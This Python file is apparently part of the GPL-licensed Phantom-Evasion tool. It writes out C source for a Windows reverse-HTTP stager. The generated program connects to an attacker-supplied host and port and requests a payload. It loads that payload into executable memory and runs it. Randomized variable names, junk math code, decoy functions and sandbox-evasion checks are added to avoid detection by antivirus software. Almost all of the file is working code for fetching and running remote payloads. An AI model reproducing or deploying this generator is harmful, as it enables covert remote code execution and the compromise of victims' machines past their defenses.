
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################

import sys
from random import shuffle  
from random import sample
sys.path.append("Modules/payloads/auxiliar")
from usefull import varname_creator
from usefull import Junkmathinject
from usefull import windows_evasion
from usefull import spawn_multiple_process
from usefull import close_brackets_multiproc
from usefull import CheckForBackslash

Lhost = CheckForBackslash(sys.argv[1])

Lport = sys.argv[2]

SpawnMultiProc = int(sys.argv[3])

Randpointer1 = varname_creator()

Randpointer2 = varname_creator()

Randbuff = varname_creator()

Randbuffer2 = varname_creator()

Randbool = varname_creator()

Randflag = varname_creator()

Randflag2 = varname_creator()

Randversion = varname_creator()

Randwsadata = varname_creator()

RandRevtarget = varname_creator()

Randsock = varname_creator()

RandSocket = varname_creator()

Randint = varname_creator()

SumValueFunc = varname_creator()

RandCharArray = varname_creator()

RandCharset = varname_creator()

RandInteger = varname_creator()

RandRecv_int = varname_creator()

ChecksumFunction = varname_creator()

RandCharPtr2 = varname_creator()

RandFuncFlag1 = varname_creator()

RandFuncFlag2 = varname_creator()

Charset = ''.join(sample("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",62))

fake_funcname1 = varname_creator()

fake_funcname2 = varname_creator()


fake_func1 = ""
fake_func1 += "void " + fake_funcname1 + "(){\n"
fake_func1 += Junkmathinject()
fake_func1 += "}\n"

fake_func2 = ""
fake_func2 += "void " + fake_funcname2 + "(){\n"
fake_func2 += Junkmathinject()
fake_func2 += "}\n"


def_func1 = ""
def_func1 += "int " + SumValueFunc + "(char " + RandCharArray + "[]) {\n"
def_func1 += "int " + RandInteger + "=0; int " + RandFuncFlag1 + ";for (" + RandFuncFlag1 + "=0; " + RandFuncFlag1 + "<strlen(" + RandCharArray + ");++" + RandFuncFlag1 + ") " + RandInteger + " += " + RandCharArray + "[" + RandFuncFlag1 + "];\n"
def_func1+= "return (" + RandInteger + " % 256);}\n"


def_func2 = ""
def_func2 += "char* " + ChecksumFunction + "(){\n"
def_func2 += "srand (time(NULL));int " + RandFuncFlag2 + ";char " + RandCharset + "[] = \"" + Charset + "\";\n"
def_func2 += "char* " + RandCharPtr2 + " = malloc(5); " + RandCharPtr2 + "[4] = 0;\n"
def_func2 += "while (TRUE){\n"
def_func2 += "for(" + RandFuncFlag2 + "=0;" + RandFuncFlag2 + "<3;++" + RandFuncFlag2 + "){" + RandCharPtr2 + "[" + RandFuncFlag2 + "] = " + RandCharset + "[rand() % (sizeof(" + RandCharset + ")-1)];}\n"
def_func2 += "for(" + RandFuncFlag2 + "=0;" + RandFuncFlag2 + "<sizeof(" + RandCharset + ");" + RandFuncFlag2 + "++){ " + RandCharPtr2 + "[3] = " + RandCharset + "[" + RandFuncFlag2 + "];\n"
def_func2 += "if (" + SumValueFunc + "(" + RandCharPtr2 + ") == 92) return " + RandCharPtr2 + "; } } return 0;}\n"




Junkcode_01 = Junkmathinject()
Junkcode_02 = Junkmathinject()
Junkcode_03 = Junkmathinject()
Junkcode_04 = Junkmathinject()
Junkcode_05 = Junkmathinject()
Junkcode_06 = Junkmathinject()
Junkcode_07 = Junkmathinject()
Junkcode_08 = Junkmathinject()
Junkcode_09 = Junkmathinject()
Junkcode_10 = Junkmathinject()
Junkcode_11 = Junkmathinject()
Junkcode_12 = Junkmathinject()
Junkcode_13 = Junkmathinject()
Junkcode_14 = Junkmathinject()
Junkcode_15 = Junkmathinject()
Junkcode_16 = Junkmathinject()
Junkcode_17 = Junkmathinject()
Junkcode_18 = Junkmathinject()
Junkcode_19 = Junkmathinject()
Junkcode_20 = Junkmathinject()
Junkcode_21 = Junkmathinject()
Junkcode_22 = Junkmathinject()

WinEvasion_01 = windows_evasion()
WinEvasion_02 = windows_evasion()
WinEvasion_03 = windows_evasion()
WinEvasion_04 = windows_evasion()
WinEvasion_05 = windows_evasion()
WinEvasion_06 = windows_evasion()
WinEvasion_07 = windows_evasion()
WinEvasion_08 = windows_evasion()
WinEvasion_09 = windows_evasion()


Hollow_code = ""

Hollow_code += "#include <winsock2.h>\n"

Include_List = ["#include <stdlib.h>\n","#include <windows.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <time.h>\n","#include <math.h>\n"]

shuffle(Include_List)

for i in range(0,len(Include_List)):

    Hollow_code += Include_List[i]

Proto_List = [def_func1 + def_func2,fake_func1,fake_func2]

shuffle(Proto_List)

for i in range(0,len(Proto_List)):

    Hollow_code += Proto_List[i]

Hollow_code += "int main(int argc,char * argv[]){\n"
Hollow_code += Junkcode_01
Hollow_code += Junkcode_02
Hollow_code += WinEvasion_01
Hollow_code += WinEvasion_02
Hollow_code += WinEvasion_03
Hollow_code += Junkcode_03
Hollow_code += WinEvasion_04
Hollow_code += WinEvasion_05
Hollow_code += Junkcode_04
Hollow_code += WinEvasion_06
Hollow_code += WinEvasion_07
Hollow_code += WinEvasion_08
Hollow_code += WinEvasion_09
Hollow_code += Junkcode_05
Hollow_code += spawn_multiple_process(SpawnMultiProc)
Hollow_code += "char * " + Randpointer1 + ";\n"
Hollow_code += "WORD " + Randversion + " = MAKEWORD(2,2);WSADATA " + Randwsadata + ";\n"
Hollow_code += fake_funcname1 + "();\n"
Hollow_code += Junkcode_06
Hollow_code += "if (WSAStartup(" + Randversion + ", &" + Randwsadata + ") < 0){\n"
Hollow_code += Junkcode_07
Hollow_code += "WSACleanup();exit(1);}\n"
Hollow_code += "struct hostent * " + RandRevtarget + ";struct sockaddr_in " + Randsock + ";SOCKET " + RandSocket + ";\n"
Hollow_code += "" + RandSocket + " = socket(AF_INET, SOCK_STREAM, 0);\n"
Hollow_code += Junkcode_08
Hollow_code += "if (" + RandSocket + " == INVALID_SOCKET){" + Junkcode_09 + " closesocket(" + RandSocket + ");WSACleanup();exit(1);}\n"
Hollow_code += "" + RandRevtarget + " = gethostbyname(\"" + Lhost + "\");\n"     #Lhost
Hollow_code += "if (" + RandRevtarget + " == NULL){" + Junkcode_10 + " closesocket(" + RandSocket + ");WSACleanup();exit(1);}\n"
Hollow_code += "memcpy(&" + Randsock + ".sin_addr.s_addr, " + RandRevtarget + "->h_addr, " + RandRevtarget + "->h_length);\n"
Hollow_code += Junkcode_11
Hollow_code += "" + Randsock + ".sin_family = AF_INET;\n"
Hollow_code += Junkcode_12
Hollow_code += "" + Randsock + ".sin_port = htons((" + Lport + "));\n"        #Lport
Hollow_code += fake_funcname2 + "();\n"
Hollow_code += "if ( connect(" + RandSocket + ", (struct sockaddr *)&" + Randsock + ", sizeof(" + Randsock + ")) ){ " + Junkcode_13 + "closesocket(" + RandSocket + ");WSACleanup();exit(1);}\n"
Hollow_code += Junkcode_14
Hollow_code += "char " + Randbuff + "[200];\n"
Hollow_code += Junkcode_15
Hollow_code += Junkcode_16
Hollow_code += Junkcode_17
Hollow_code += "sprintf(" + Randbuff + ", \"GET /%s HTTP/1.1\\r\\nAccept-Encoding: identity\\r\\nHost: " + Lhost + ":" + Lport + "\\r\\nConnection: close\\r\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.1; Windows NT\\r\\n\\r\\n\", " + ChecksumFunction + "());\n"
Hollow_code += "send(" + RandSocket + "," + Randbuff + ", strlen( " + Randbuff + " ),0);\n"
Hollow_code += "Sleep(300);\n"
Hollow_code += Randpointer1 + " = VirtualAlloc(0, 1000000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
Hollow_code += "char * " + Randpointer2 + " = " + Randpointer1 + ";\n"
Hollow_code += "int " + RandRecv_int + ";\n"
Hollow_code += "do {" + RandRecv_int + " = recv(" + RandSocket + ", " + Randpointer2 + ", 1024, 0);\n"
Hollow_code += Randpointer2 + " += " + RandRecv_int + ";\n"
Hollow_code += "}while ( " + RandRecv_int + " > 0 );\n"
Hollow_code += Junkcode_18
Hollow_code += "closesocket(" + RandSocket + "); WSACleanup();\n"
Hollow_code += "((void (*)())strstr(" + Randpointer1 + ", \"\\r\\n\\r\\n\") + 4)();\n"
Hollow_code += close_brackets_multiproc(SpawnMultiProc)
Hollow_code += "}}}}\n"
Hollow_code += "}else{" + Junkcode_19 + "}\n"
Hollow_code += "}else{" + Junkcode_20 + "}\n"
Hollow_code += "}else{" + Junkcode_21 + "}\n"
Hollow_code += "}else{" + Junkcode_22 + "}\n"
Hollow_code += "}return 0;}"
Hollow_code = Hollow_code.encode('utf-8')

with open('Source.c','wb') as f:
    f.write(Hollow_code)

